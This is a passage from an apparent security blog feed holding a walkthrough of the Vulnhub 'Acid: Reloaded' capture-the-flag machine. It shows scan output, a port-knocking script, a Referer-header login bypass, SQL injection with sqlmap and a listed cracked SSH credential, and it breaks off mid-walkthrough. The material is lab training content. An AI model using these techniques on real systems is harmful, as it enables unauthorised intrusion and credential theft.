</span><span class='line'>-rw<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-.  <span class="m">1</span> root root   <span class="m">133</span> Jan <span class="m">18</span>  <span class="m">2015</span> .lesshst
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>.  <span class="m">2</span> root root     <span class="m">6</span> Jun <span class="m">19</span> 08:39 .ssh
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>.  <span class="m">1</span> root root   <span class="m">129</span> Dec <span class="m">29</span>  <span class="m">2013</span> .tcshrc
</span><span class='line'>-r<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>.  <span class="m">1</span> root root <span class="m">14892</span> Jul <span class="m">14</span> 14:25 flag.txt
</span><span class='line'>bash-4.2# cat /root/flag.txt
</span><span class='line'>cat /root/flag.txt
</span><span class='line'>Well <span class="k">done</span>!&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Here<span class="p">&amp;</span>rsquo<span class="p">;</span>s your flag: 3eb030c6ab099b0a355712fe38d59ffb&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Ascii Art: Mark Van Hooren
</span><span class='line'><span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.retrojunkie.com/asciiart/cartchar/snowwhit.htm&quot;</span>&gt;http://www.retrojunkie.com/asciiart/cartchar/snowwhit.htm&lt;/a&gt;<span class="o">)</span>
</span><span class='line'>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span> turncate <span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Thanks Sagi- and cheers g0blin!</p>

<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]acid_reloaded]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/09/12/acid-reloaded/"/>
    <updated>2015-09-12T07:49:42-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/09/12/acid-reloaded</id>
    <content type="html"><![CDATA[<p><strong>Acid: Reloaded</strong> is created by <a href="https://twitter.com/@m_avinash143">Avinash Kumar Thapa</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/acid-reloaded,127/">here</a>.</p>

<!-- more -->


<h2>Links</h2>

<p>watch video online:
<iframe src='http://player.vimeo.com/video/139052982?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe></p>

<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.1.1.139/24</em>)</p>

<p>Target: Acid: Server (<em>10.1.1.130/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Ports knocking to active hidden ports</li>
<li>Hidden paths and files can be found via tool <code>dirbuster</code></li>
<li>Web login bypass by add HTTP header <code>Referer</code> in Request</li>
<li>SQL injection vulnerability exists in <code>http://10.1.1.139:33447/bin/l33t_haxor.php?id=</code>, exploit it and check database to find hidden file location <code>UB3R/strcpy.exe</code></li>
<li>Download and analyze the EXE file, found it binded with other files, use <code>foremost</code> tool to recover hidden files and find XML contacts file <code>Avinash.contact</code></li>
<li>Making a dictionary file from the contact file, here need to note that there is a base64 encoded string, decode it and put in dictionary file</li>
<li>use HYDRA to brute force SSH service with dictionary file and found cracked login <code>makke/NooB@123</code></li>
<li>Login as user <code>makke</code>, poking around and found Overlayfs Local Root (CVE-2015-1328) vulnerability exist and exploit it to get ROOT</li>
<li>overlayfs Local Root exploit (CVE-2015-1328) exist, exploit it to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">unicornscan</font> &amp; <font color="FF8000">nmap</font>]</li>
<li>Write python script to make port knocking to active filtered ports</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
<li>Web application scanning by Nikto to find more details or vulnerabilities [<font color="FF8000">nikto</font>]</li>
<li>Brute force scan to find hidden path [<font color="FF8000">dirbuster</font>]</li>
<li>Found the hidden web login page and bypass it</li>
<li>Exploit SQL injection vulnerability found in <code>/bin/l33t_haxor.php?id=</code> to get hidden file location <code>UB3R/strcpy.exe</code></li>
<li>Use <code>foremost</code> to recover hidden files in <code>strcpy.exe</code> [<font color="FF8000">foremost</font>]</li>
<li>Create dictionary file and use HYDRA to brute force SSH login, and found <code>makke/NooB@123</code></li>
<li>Enumeration and found the server is vulnerable to CVE-2015-1328, exploit it to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/dneufeld/unicornscan">unicornscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="http://foremost.sourceforge.net/">foremost</a></li>
<li><a href="https://www.thc.org/thc-hydra/">hydra</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using arp-scan as routine to detect the target&rsquo;s IP address (10.1.1.139 in this case).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink type: EN10MB (Ethernet)
</span><span class='line'>Starting arp-scan 1.9 with 256 hosts (&lt;a href="http://www.nta-monitor.com/tools/arp-scan/">http://www.nta-monitor.com/tools/arp-scan/&lt;/a>)
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2    00:50:56:fd:d1:6b   VMware, Inc.
</span><span class='line'>10.1.1.139  00:0c:29:bb:6e:b3   VMware, Inc.
</span><span class='line'>10.1.1.254  00:50:56:e3:03:1b   VMware, Inc.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>4 packets received by filter, 0 packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: 256 hosts scanned in 2.611 seconds (98.05 hosts/sec). 4 responded</span></code></pre></td></tr></table></div></figure></p>

<p>10.1.1.139 is our Target!</p>

<p>Then run uniscornscan to detect opening ports on the target (unicornscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# us -msf -T4 -p1-65535 -Iv 10.1.1.139
</span><span class='line'>adding 10.1.1.139/32 mode &lt;code>TCPscan' ports&lt;/code>1-65535' pps 300
</span><span class='line'>using interface(s) eth0
</span><span class='line'>scaning 1.00e+00 total hosts with 6.55e+04 total packets, should take a little longer than 3 Minutes, 45 Seconds
</span><span class='line'>connected 10.1.1.130:39969 -> 10.1.1.139:22
</span><span class='line'>TCP open 10.1.1.139:22  ttl 64
</span><span class='line'>sender statistics 288.7 pps with 65535 packets sent total
</span><span class='line'>listener statistics 131072 packets recieved 0 packets droped and 0 interface drops
</span><span class='line'>TCP open                 ssh[   22]     from 10.1.1.139  ttl 64</span></code></pre></td></tr></table></div></figure></p>

<p>Then I connect to target via SSH to grab banner.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ssh 10.1.1.139
</span><span class='line'>    _    &lt;em>&lt;strong>&lt;em> &lt;/em>&lt;/strong> &lt;/em>&lt;em>&lt;strong>        &lt;/strong>&lt;strong>  &lt;/strong>&lt;/em>&lt;strong> _     &lt;/strong>&lt;em>    _    &lt;/em>&lt;strong>&lt;em>  &lt;/em>&lt;/strong>&lt;strong> &lt;/strong>&lt;strong>&lt;br/>
</span><span class='line'>   / \  / &lt;/strong>&lt;em>|&lt;/em> &lt;em>|  _ \      |  _ | &lt;/em>&lt;em>&lt;strong>| |   / _ \  / \  |  _ | &lt;/strong>&lt;strong>|  _ \
</span><span class='line'>  / _ | |    | || | | |&lt;/strong>&lt;/em>&lt;strong>| |&lt;em>) |  &lt;/em>| | |  | | | |/ _ \ | | | |  &lt;em>| | | | |
</span><span class='line'> / &lt;/em>&lt;/strong> \ |&lt;strong>&lt;em> | || |&lt;/em>| |&lt;/strong>&lt;strong>&lt;em>|  _ &lt;| |&lt;/em>&lt;/strong>| |&lt;strong>| |&lt;em>| / &lt;/em>&lt;/strong> | |&lt;em>| | |&lt;/em>&lt;strong>| |&lt;em>| |
</span><span class='line'>/&lt;/em>/   __&lt;/strong>&lt;em>|&lt;/em>&lt;strong>|&lt;/strong>&lt;strong>/      |_| __&lt;/strong>&lt;strong>|&lt;/strong>&lt;em>&lt;strong>_&lt;/strong>/&lt;/em>/   __&lt;strong>&lt;em>/|&lt;/em>&lt;/strong>&lt;strong>|&lt;/strong>__/&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code>                                -by Acid
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;p>Wanna Knock me out ???
</span><span class='line'>3.2.1 Let&rsquo;s Start the Game.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>&lt;a href="&#109;&#x61;&#105;&#108;&#x74;&#x6f;&#58;&#114;&#111;&#111;&#x74;&#64;&#x31;&#x30;&#x2e;&#x31;&#x2e;&#x31;&#x2e;&#49;&#x33;&#57;">&#x72;&#111;&#111;&#116;&#64;&#x31;&#48;&#x2e;&#49;&#46;&#x31;&#x2e;&#49;&#51;&#57;&lt;/a>&rsquo;s password:</span></code></pre></td></tr></table></div></figure></p>

<p>Looks like we need ports knocking to find hidden ports. Then the following python script will do the port knocking</p>

<p><figure class='code'><figcaption><span>knock.py </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">target</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mf">10.1</span><span class="o">.</span><span class="mf">1.139</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
</span><span class='line'><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">4</span><span class="p">)):</span>
</span><span class='line'>    <span class="n">packet</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">target</span><span class="p">)</span><span class="o">/</span><span class="n">TCP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="n">x</span><span class="p">,</span> <span class="n">flags</span><span class="o">=&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">S</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span>
</span><span class='line'>    <span class="n">response</span> <span class="o">=</span> <span class="n">sr1</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.5</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">response</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span><span class="n">knocking</span> <span class="n">port</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span><span class="n">Done</span><span class="err">!</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Then use unicornscan to check again, found another port <code>33447</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# us -msf -T4 -p1-65535 -Iv 10.1.1.139
</span><span class='line'>adding 10.1.1.139/32 mode &lt;code>TCPscan' ports&lt;/code>1-65535' pps 300
</span><span class='line'>using interface(s) eth0
</span><span class='line'>scaning 1.00e+00 total hosts with 6.55e+04 total packets, should take a little longer than 3 Minutes, 45 Seconds
</span><span class='line'>connected 10.1.1.130:22339 -> 10.1.1.139:22
</span><span class='line'>TCP open 10.1.1.139:22  ttl 64
</span><span class='line'>connected 10.1.1.130:38957 -> 10.1.1.139:33447
</span><span class='line'>TCP open 10.1.1.139:33447  ttl 64
</span><span class='line'>sender statistics 277.8 pps with 65535 packets sent total
</span><span class='line'>listener statistics 131078 packets recieved 0 packets droped and 0 interface drops
</span><span class='line'>TCP open                 ssh[   22]     from 10.1.1.139  ttl 64
</span><span class='line'>TCP open             unknown[33447]     from 10.1.1.139  ttl 64</span></code></pre></td></tr></table></div></figure></p>

<p>Using NMAP scan to detect more information about opening services, and found WEB service is running on port <code>33447</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# nmap -sV -v -p22,33447 -T4 10.1.1.139&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Starting Nmap 6.49BETA4 ( &lt;a href="https://nmap.org">https://nmap.org&lt;/a> ) at 2015-09-11 07:26 EDT
</span><span class='line'>NSE: Loaded 33 scripts for scanning.
</span><span class='line'>Initiating ARP Ping Scan at 07:26
</span><span class='line'>Scanning 10.1.1.139 [1 port]
</span><span class='line'>Completed ARP Ping Scan at 07:26, 0.24s elapsed (1 total hosts)
</span><span class='line'>Initiating Parallel DNS resolution of 1 host. at 07:26
</span><span class='line'>Completed Parallel DNS resolution of 1 host. at 07:26, 0.02s elapsed
</span><span class='line'>Initiating SYN Stealth Scan at 07:26
</span><span class='line'>Scanning 10.1.1.139 [2 ports]
</span><span class='line'>Discovered open port 22/tcp on 10.1.1.139
</span><span class='line'>Discovered open port 33447/tcp on 10.1.1.139
</span><span class='line'>Completed SYN Stealth Scan at 07:26, 0.21s elapsed (2 total ports)
</span><span class='line'>Initiating Service scan at 07:26
</span><span class='line'>Scanning 2 services on 10.1.1.139
</span><span class='line'>Completed Service scan at 07:26, 11.04s elapsed (2 services on 1 host)
</span><span class='line'>NSE: Script scanning 10.1.1.139.
</span><span class='line'>Initiating NSE at 07:26
</span><span class='line'>Completed NSE at 07:26, 0.34s elapsed
</span><span class='line'>Nmap scan report for 10.1.1.139
</span><span class='line'>Host is up (0.00050s latency).
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>22/tcp    open  ssh     OpenSSH 6.7p1 Ubuntu 5ubuntu1.3 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
</span><span class='line'>MAC Address: 00:0C:29:BB:6E:B3 (VMware)
</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Read data files from: /usr/bin/../share/nmap
</span><span class='line'>Service detection performed. Please report any incorrect results at &lt;a href="https://nmap.org/submit/">https://nmap.org/submit/&lt;/a> .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 12.65 seconds
</span><span class='line'>           Raw packets sent: 3 (116B) | Rcvd: 3 (116B)</span></code></pre></td></tr></table></div></figure></p>

<p>Run NIKTO scan to check the web application and found hidden folder <code>/bin/</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nikto -host &lt;a href="http://10.1.1.139:3344/">http://10.1.1.139:3344/&lt;/a>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h2>- Nikto v2.1.6&lt;/h2>
</span><span class='line'>
</span><span class='line'>&lt;h2>+ No web server found on 10.1.1.139:3344&lt;/h2>
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>0 host(s) tested
</span><span class='line'>root@kali:~# nikto -host &lt;a href="http://10.1.1.139:33447/">http://10.1.1.139:33447/&lt;/a>
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Nikto v2.1.6&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Target IP:          10.1.1.139&lt;/li>
</span><span class='line'>&lt;li>Target Hostname:    10.1.1.139&lt;/li>
</span><span class='line'>&lt;li>Target Port:        33447
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Start Time:         2015-09-11 07:31:36 (GMT-4)&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Server: Apache/2.4.10 (Ubuntu)&lt;/li>
</span><span class='line'>&lt;li>Server leaks inodes via ETags, header found with file /, fields: 0x2aa 0x51e107200fa1d&lt;/li>
</span><span class='line'>&lt;li>The anti-clickjacking X-Frame-Options header is not present.&lt;/li>
</span><span class='line'>&lt;li>The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS&lt;/li>
</span><span class='line'>&lt;li>The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type&lt;/li>
</span><span class='line'>&lt;li>IP address found in the &lsquo;location&rsquo; header. The IP is &ldquo;127.0.1.1&rdquo;.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is &ldquo;&lt;a href="http://127.0.1.1:33447/images/">http://127.0.1.1:33447/images/&lt;/a>&rdquo;.&lt;/li>
</span><span class='line'>&lt;li>Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.&lt;/li>
</span><span class='line'>&lt;li>Allowed HTTP Methods: GET, HEAD, POST, OPTIONS&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3092: /bin/: This might be interesting&hellip;&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3092: /bin/: This might be interesting&hellip; possibly a system shell found.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3233: /icons/README: Apache default file found.&lt;/li>
</span><span class='line'>&lt;li>8330 requests: 0 error(s) and 11 item(s) reported on remote host
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>End Time:           2015-09-11 07:31:58 (GMT-4) (22 seconds)&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p>check the new folder <code>/bin/</code> found a login page. By checking the source code, the login process function is in <code>/includes/validation.php</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;h2&gt;</span>Login to your account<span class="nt">&lt;/h2&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>   <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;includes/validation.php&quot;</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span> <span class="na">name=</span><span class="s">&quot;login_form&quot;</span><span class="nt">&gt;</span>  Email: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">placeholder=</span><span class="s">&quot;Email Address&quot;</span> <span class="na">name=</span><span class="s">&quot;email&quot;</span> <span class="na">maxlength=</span><span class="s">&quot;20&quot;</span> <span class="nt">/&gt;</span>  Password: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;password&quot;</span> <span class="na">placeholder=</span><span class="s">&quot;Password&quot;</span> <span class="na">name=</span><span class="s">&quot;password&quot;</span> <span class="na">id=</span><span class="s">&quot;password&quot;</span><span class="nt">/&gt;</span>  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span> <span class="na">value=</span><span class="s">&quot;Login&quot;</span> <span class="na">onclick=</span><span class="s">&quot;formhash(this.form, this.form.password);&quot;</span> <span class="nt">/&gt;</span>  <span class="nt">&lt;/form&gt;</span>   <span class="nt">&lt;/form&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Then using dirbuster to brute force hidden files and paths and found the page <code>/bin/dashboard.php</code></p>

<p>After a lot of failed tests, I finally found that HTTP header trick to bypass the login by adding the header <code>Referere: http://10.1.1.139:33447/bin/includes/validation.php</code>, Burp proxy help me to get next step.</p>

<p>Then I reach here <code>http://10.1.1.139:33447/bin/l33t_haxor.php</code>, by checking the source code I found the following URL <code>http://10.1.1.139:33447/bin/l33t_haxor.php?id=</code> and the parameter <code>id</code> is SQL injectable.</p>

<p>Using SQLMAP to exploit the SQL injection vulnerability and found the current database and tables:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&hellip;
</span><span class='line'>available databases [4]:                                                                                                                                                         &lt;br/>
</span><span class='line'>[&lt;em>] information_schema
</span><span class='line'>[&lt;/em>] mysql
</span><span class='line'>[&lt;em>] performance_schema
</span><span class='line'>[&lt;/em>] secure_login
</span><span class='line'>&hellip;</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&hellip;
</span><span class='line'>Database: secure_login                                                                                                                                                           &lt;br/>
</span><span class='line'>[4 tables]
</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
</span><span class='line'>| UB3R/strcpy.exe |
</span><span class='line'>| login_attempts  |
</span><span class='line'>| members         |
</span><span class='line'>| word            |
</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
</span><span class='line'>&hellip;</span></code></pre></td></tr></table></div></figure></p>

<p>from the SQL injection exploit, I found <code>UB3R/strcpy.exe</code> which is interesting. Then I downloaded the binary file from <code>http://10.1.1.139:33447/UB3R/strcpy.exe</code>. By checking the file, I found there are some other files hidden in <code>strcpy.exe</code>, so I use <code>foremost</code> to recover them</p>

